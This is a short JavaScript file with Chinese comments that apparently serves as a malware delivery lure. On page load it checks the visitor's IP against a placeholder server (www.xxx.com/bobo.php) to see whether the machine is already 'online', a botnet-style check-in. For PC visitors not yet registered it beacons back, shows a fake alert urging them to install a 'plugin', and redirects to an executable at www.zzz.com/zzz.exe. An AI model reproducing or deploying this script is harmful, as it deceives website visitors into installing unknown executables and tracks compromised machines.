var returnCitySN = {"cip": "0.0.0.0", "bobo": "000000"};
//document.write("<script src='http://pv.sohu.com/cityjson?ie=utf-8'></script>");
document.write("<script src='http://www.xxx.com/bobo.php?getaddr=123'></script>");


//上线检测
function isRise(ip,bobo) {
    var xmlHttp;
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest();
    } else {
        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlHttp.open("GET", "http://www.xxx.com/bobo.php?search="+ip, "true");
    xmlHttp.send();
    xmlHttp.onreadystatechange = function() {
		//alert(xmlHttp.responseText)
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
            var resData = xmlHttp.responseText;
            if (resData == "in" && bobo == "111111") {
            } else {
				document.write("<script src='http://www.xxx.com/bobo.php?bobo=1'></script>");
                download();
            }
        }
    }
}

//下载
function download(){
    alert("请尝试下载并安装插件后访问本页面!");
    window.location.href="http://www.zzz.com/zzz.exe";
}

//判断是否是PC
function isPc() {
    if (navigator.userAgent.match(/(iPhone|Android)/i)) {
        return false;
    } else {
        return true;
    }
}

//load,ipbase64编码后,传递给后端
window.onload = function(){
    if(!isPc()){
        alert("当前页面只能在电脑PC端中加载,请稍后重试...");
    }else{
        isRise(returnCitySN["cip"], returnCitySN["bobo"]);
    }
}
